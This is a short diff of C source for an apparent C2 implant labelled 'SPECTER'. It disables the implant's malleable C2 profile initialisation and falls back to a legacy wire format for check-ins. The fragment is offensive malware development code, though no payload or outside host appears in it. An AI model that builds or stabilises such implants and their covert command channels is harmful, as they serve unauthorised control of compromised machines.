@@ -281,22 +281,11 @@ void implant_entry(PVOID param) {
         }
     }
 
-    /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
-    {
-        IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
-        if (cfg && cfg->profile_blob && cfg->profile_blob_len > 0) {
-            static PROFILE_CONFIG g_profile_cfg;
-            NTSTATUS pstatus = profile_init(cfg->profile_blob, cfg->profile_blob_len, &g_profile_cfg);
-            if (NT_SUCCESS(pstatus)) {
-                comms_set_profile(&g_ctx, &g_profile_cfg);
-                DEV_TRACE("[SPECTER] profile attached to comms");
-            } else {
-                DEV_TRACE("[SPECTER] profile_init failed, using legacy wire format");
-            }
-        } else {
-            DEV_TRACE("[SPECTER] no profile blob in config, using legacy wire format");
-        }
-    }
+    /* ---- Step 7b: Initialize malleable C2 profile ---- */
+    /* DISABLED: Profile-driven comms path crashes (Phase 0 stabilization).
+       The profile system needs debugging before enabling. Using legacy
+       wire format for all checkins. Re-enable after Phase 1.3 (roadmap). */
+    DEV_TRACE("[SPECTER] profile disabled (Phase 0), using legacy wire format");
 
     /* ---- Step 8: Enter main loop ---- */
     g_ctx.running = TRUE;
